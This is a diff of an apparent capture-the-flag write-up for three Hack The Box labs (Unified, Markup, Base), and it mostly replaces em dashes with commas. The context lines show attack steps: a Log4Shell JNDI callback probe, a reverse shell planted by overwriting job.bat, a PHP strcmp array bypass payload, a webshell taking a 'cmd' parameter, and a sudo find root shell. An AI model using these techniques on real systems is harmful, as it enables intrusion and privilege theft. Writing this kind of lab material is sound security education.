@@ -89,11 +89,11 @@ PORT     STATE SERVICE         VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-The `8443` certificate names `UniFi` / Ubiquiti, and the redirect lands on `/manage/account/login`. Visiting the page confirms **UniFi Network 6.4.54** — a version affected by Log4Shell.
+The `8443` certificate names `UniFi` / Ubiquiti, and the redirect lands on `/manage/account/login`. Visiting the page confirms **UniFi Network 6.4.54**, a version affected by Log4Shell.
 
 ![UniFi Network 6.4.54 login page](/images/writeups/hackthebox/unified-unifi-login.png)
 
-A quick password attempt is rejected, which is expected — this box is about injection, not credential guessing.
+A quick password attempt is rejected, which is expected, this box is about injection, not credential guessing.
 
 ![Failed login attempt against the UniFi controller](/images/writeups/hackthebox/unified-failed-login.png)
 
@@ -126,7 +126,7 @@ Traceback (most recent call last):
 FileNotFoundError: [Errno 2] No such file or directory: '/home/xzdreamer/Downloads/jdk1.8.0_20/bin/java'
 ```
 
-The exploit script hardcodes a bundled JDK that is not present in this download. Rather than fixing its layout, I reproduce the attack by hand — which also makes each step visible.
+The exploit script hardcodes a bundled JDK that is not present in this download. Rather than fixing its layout, I reproduce the attack by hand, which also makes each step visible.
 
 ---
 
@@ -163,7 +163,7 @@ Replace the `remember` value with a JNDI probe pointing back at that address:
 
 ![Burp Repeater with the Log4Shell probe in the remember field](/images/writeups/hackthebox/unified-jndi-test-payload.png)
 
-The response is an error (`api.err.InvalidPayload`), but that doesn't matter — the important evidence is in tcpdump:
+The response is an error (`api.err.InvalidPayload`), but that doesn't matter, the important evidence is in tcpdump:
 
 ```text
 03:22:55.972368 IP 10.129.96.149.38432 > 10.10.15.192.ldap: Flags [S], seq 2345850386, win 64240, options [mss 1362,sackOK,TS val 1911534991 ecr 0,nop,wscale 7], length 0
@@ -285,7 +285,7 @@ unifi@unified:/home/michael$ cat user.txt
 
 ---
 
-### Privilege escalation — rewriting the admin hash
+### Privilege escalation: rewriting the admin hash
 
 Query the `admin` collection in the `ace` database:
 
@@ -308,7 +308,7 @@ The first record is the controller administrator, alongside accounts for `michae
 }
 ```
 
-Cracking that hash is unnecessary — the `unifi` account can write to its own database. Generate a SHA-512 hash for a password we know and replace the administrator's:
+Cracking that hash is unnecessary, the `unifi` account can write to its own database. Generate a SHA-512 hash for a password we know and replace the administrator's:
 
 ```bash
 mkpasswd -m sha-512 Password1234
@@ -353,7 +353,7 @@ Box pwned.
 | | |
 |---|---|
 | **Name** | Markup |
-| **Platform** | Hack The Box — Starting Point, Tier 2 |
+| **Platform** | Hack The Box, Starting Point, Tier 2 |
 | **OS** | Windows Server 2019 (`10.0.17763.107`) |
 | **Web stack** | Apache `2.4.41`, PHP `7.2.28`, OpenSSL `1.1.1c` |
 | **Attack vector** | XML External Entity injection in the `Order in Bulk` form |
@@ -368,7 +368,7 @@ Wappalyzer identifies the stack before any interaction with the application:
 
 ---
 
-### Task 1 — Apache version
+### Task 1: Apache version
 
 > What version of Apache is running on the target's port 80?
 
@@ -378,7 +378,7 @@ The `Server` response header and Wappalyzer both report `Apache/2.4.41 (Win64) O
 
 ---
 
-### Task 2 — Credentials
+### Task 2: Credentials
 
 > What username:password combination logs in successfully?
 
@@ -390,7 +390,7 @@ The login form at the root of the site accepts the default pair.
 
 ---
 
-### Task 3 — The user-input word
+### Task 3: The user-input word
 
 > What is the word at the top of the page that accepts user input?
 
@@ -406,7 +406,7 @@ The same form in a full-page browser view:
 
 ---
 
-### Task 4 — XML version
+### Task 4: XML version
 
 > What XML version is used on the target?
 
@@ -431,13 +431,13 @@ http.setRequestHeader('Content-Type', 'text/xml');
 http.send(xmlTemplate);
 ```
 
-The application sends a `text/xml` body to `process.php` — and that parser is the way in.
+The application sends a `text/xml` body to `process.php`, and that parser is the way in.
 
 ![DevTools showing the XML template built from form fields](/images/writeups/hackthebox/markup-xml-source.png)
 
 ---
 
-### Task 5 — The acronym
+### Task 5: The acronym
 
 > What does the XXE / XEE attack acronym stand for?
 
@@ -447,7 +447,7 @@ The parser resolves external entities declared in a `DOCTYPE`, so a `SYSTEM` ent
 
 ---
 
-### Task 6 — The username in source
+### Task 6: The username in source
 
 > What username can we find on the webpage's HTML code?
 
@@ -465,7 +465,7 @@ That gives us a Windows username to target with the XXE read.
 
 ---
 
-### Task 7 — The file in Log-Management
+### Task 7: The file in Log-Management
 
 > What is the file located in the Log-Management folder on the target?
 
@@ -518,7 +518,7 @@ daniel@MARKUP C:\Log-Management>dir
 
 ---
 
-### Task 8 — The executable in job.bat
+### Task 8: The executable in job.bat
 
 > What executable is mentioned in the file mentioned before?
 
@@ -542,7 +542,7 @@ exit
 
 **Answer:** `wevtutil.exe`
 
-The batch file clears Windows event logs using `wevtutil.exe`, and it is designed to run as Administrator. That makes it an ideal hijack target — if we can write to it and something privileged executes it, we get a privileged shell.
+The batch file clears Windows event logs using `wevtutil.exe`, and it is designed to run as Administrator. That makes it an ideal hijack target, if we can write to it and something privileged executes it, we get a privileged shell.
 
 ---
 
@@ -575,7 +575,7 @@ job.bat BUILTIN\Users:(F)
 Successfully processed 1 files; Failed processing 0 files
 ```
 
-`BUILTIN\Users:(F)` — every user has full control. Overwrite `job.bat` with a reverse-shell command and wait for a privileged process to run it.
+`BUILTIN\Users:(F)`, every user has full control. Overwrite `job.bat` with a reverse-shell command and wait for a privileged process to run it.
 
 Download a Windows netcat binary ([nc64.exe](https://github.com/rahuldottech/netcat-for-windows/releases/download/1.12/nc64.exe)) to the attack machine and serve it:
 
@@ -643,14 +643,14 @@ f574…70f8
 | | |
 |---|---|
 | **Name** | Base |
-| **Platform** | Hack The Box — Starting Point (final lab) |
+| **Platform** | Hack The Box, Starting Point (final lab) |
 | **OS** | Ubuntu 18.04.6 LTS, kernel `4.15.0-151-generic` |
 | **Web stack** | Apache `2.4.29` (Ubuntu), PHP |
 | **Attack vector** | Exposed Vim swap file → `strcmp()` array bypass → unrestricted webshell upload → `find` sudo abuse |
 
 ---
 
-### Task 1 — Open ports
+### Task 1: Open ports
 
 > Which two TCP ports are open on the remote host?
 
@@ -671,11 +671,11 @@ PORT   STATE SERVICE VERSION
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-**Answer:** `22, 80` — SSH and a plain HTTP site.
+**Answer:** `22, 80`, SSH and a plain HTTP site.
 
 ---
 
-### Task 2 — Login path
+### Task 2: Login path
 
 > What is the relative path on the webserver for the login page?
 
@@ -685,11 +685,11 @@ The site's navigation links straight to it from the landing page.
 
 ---
 
-### Task 3 — Files in the login directory
+### Task 3: Files in the login directory
 
 > How many files are present in the `/login` directory?
 
-**Answer:** `3` — `login.php`, `login.php.swp`, and `config.php`.
+**Answer:** `3`, `login.php`, `login.php.swp`, and `config.php`.
 
 The swap file is the interesting one; it shouldn't be served at all.
 
@@ -701,7 +701,7 @@ The swap file is the interesting one; it shouldn't be served at all.
 
 ---
 
-### Task 4 — Swap file extension
+### Task 4: Swap file extension
 
 > What is the file extension of a swap file?
 
@@ -711,11 +711,11 @@ Vim writes `.swp` files while a document is open and, if interrupted, leaves the
 
 ---
 
-### Task 5 — The comparison function
+### Task 5: The comparison function
 
 > Which PHP function is being used in the backend code to compare the user submitted username and password to the valid username and password?
 
-Download `login.php.swp` and run `strings` on it — the source is recoverable even though `cat` shows mostly noise:
+Download `login.php.swp` and run `strings` on it, the source is recoverable even though `cat` shows mostly noise:
 
 ```bash
 strings -n 5 login.php.swp
@@ -738,11 +738,11 @@ if (!empty($_POST['username']) && !empty($_POST['password'])) {
 
 **Answer:** `strcmp()`
 
-`strcmp()` compares two **strings**. PHP's loose comparison of an array against a string returns `NULL`, and in PHP 5/7 `NULL == 0` evaluates to `true` — so submitting both fields as arrays bypasses the check.
+`strcmp()` compares two **strings**. PHP's loose comparison of an array against a string returns `NULL`, and in PHP 5/7 `NULL == 0` evaluates to `true`, so submitting both fields as arrays bypasses the check.
 
 ---
 
-### Task 6 — Upload directory
+### Task 6: Upload directory
 
 > In which directory are the uploaded files stored?
 
@@ -789,7 +789,7 @@ login                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration:
 
 ---
 
-### Task 7 — User with a home directory
+### Task 7: User with a home directory
 
 > Which user exists on the remote host with a home directory?
 
@@ -815,7 +815,7 @@ http://10.129.62.191/_uploaded/test.php?cmd=ls%20/home
 
 ---
 
-### Task 8 — Password for that user
+### Task 8: Password for that user
 
 > What is the password for the user present on the system?
 
@@ -867,7 +867,7 @@ f548…158e
 
 ---
 
-### Task 10 — sudo command
+### Task 10: sudo command
 
 > What is the full path to the command that the user john can run as user root on the remote host?
 
@@ -884,7 +884,7 @@ User john may run the following commands on base:
 
 ---
 
-### Task 11 — Exploitable find action
+### Task 11: Exploitable find action
 
 > What action can the `find` command use to execute commands?
 
@@ -914,12 +914,12 @@ root.txt
 ---
 
 <Callout type="tip" title="Starting Point Complete">
-  Base was the last lab. With Markup and Base documented here — and Unified merged in — the entire Hack The Box Starting Point path is complete.
+  Base was the last lab. With Markup and Base documented here, and Unified merged in, the entire Hack The Box Starting Point path is complete.
 </Callout>
 
 <div className="max-w-[420px] mx-auto">
 
-![You have solved Base — 250 XP earned](/images/writeups/hackthebox/base-solved.png)
+![You have solved Base, 250 XP earned](/images/writeups/hackthebox/base-solved.png)
 
 </div>
 
@@ -932,20 +932,20 @@ root.txt
 - **Log4Shell does not need a working exploit script.** The `log4j-shell-poc` tooling failed because of a missing bundled JDK, but the vulnerability itself was reachable with nothing more than Burp, a modified JSON field, and `tcpdump`.
 - **Trust the out-of-band signal, not the HTTP status.** The login endpoint returned `400` every time; the JNDI injection was proven by the LDAP SYN arriving on `tun0`.
 - **`rogue-jndi` needs a matching endpoint.** The generic `ldap://IP/test` probe only confirmed the callback; the Tomcat controller (`/o=tomcat`) was what delivered the `ELProcessor` payload and reverse shell.
-- **A service account is often a database administrator too.** The `unifi` user had full read/write access to the controller's MongoDB, which made cracking the hash unnecessary — replacing it was faster and deterministic.
+- **A service account is often a database administrator too.** The `unifi` user had full read/write access to the controller's MongoDB, which made cracking the hash unnecessary, replacing it was faster and deterministic.
 - **Application config is a credential store.** UniFi's SSH Authentication settings exposed the root password in plain text. Once you control the application's admin session, OS-level access is often one setting away.
 - **Watch for localhost-only databases.** Port `27117` never appeared in the external `nmap` scan. Enumerating running processes from inside the foothold (`ps aux | grep mongo`) is what revealed it.
 
 ### Markup
 
 - **The guided questions are a breadcrumb trail, not busywork.** Each answer (Apache version, `admin:password`, `order`, XML 1.0, `Daniel`, `job.bat`, `wevtutil.exe`) feeds the next step. The "Modified by Daniel" source comment is what turns a generic XXE into a targeted read of `C:\Users\daniel\.ssh\id_rsa`.
-- **XXE is a file-read primitive, not just a parser bug.** The `POST /process.php` endpoint accepted a `DOCTYPE` declaration and happily expanded `SYSTEM "file:///..."` — handing over the private key needed for the next stage.
+- **XXE is a file-read primitive, not just a parser bug.** The `POST /process.php` endpoint accepted a `DOCTYPE` declaration and happily expanded `SYSTEM "file:///..."`, handing over the private key needed for the next stage.
 - **Always run `icacls` on interesting Windows scripts.** `BUILTIN\Users:(F)` on `job.bat` meant any user could replace a script that runs with elevated privileges. That single ACL is the whole privilege escalation.
 - **A service account's tooling becomes your payload delivery.** Python's `http.server` plus PowerShell's `wget` moved `nc64.exe` onto the target without needing any exploit-specific upload primitive.
 ### Base
 
 - **Never leave editor swap files in the webroot.** `login.php.swp` was a full source disclosure: `strings -n 5` recovered the `strcmp()` calls that became the authentication bypass.
-- **`strcmp()` with arrays is a classic PHP type-juggling bug.** Posting `username[]=admin&password[]=pass` makes both comparisons return `NULL`, which loosely equals `0` — the login accepts it.
+- **`strcmp()` with arrays is a classic PHP type-juggling bug.** Posting `username[]=admin&password[]=pass` makes both comparisons return `NULL`, which loosely equals `0`, the login accepts it.
 - **Restricted uploads mean nothing if the upload directory executes code.** A 20-byte webshell in `_uploaded` gave command execution as `www-data`, and the site's own `config.php` supplied john's password.
 - **`find -exec` is a full shell when sudo allows it.** `(root : root) /usr/bin/find` is effectively root: `sudo find . -exec /bin/sh \; -quit` ends the path.
 
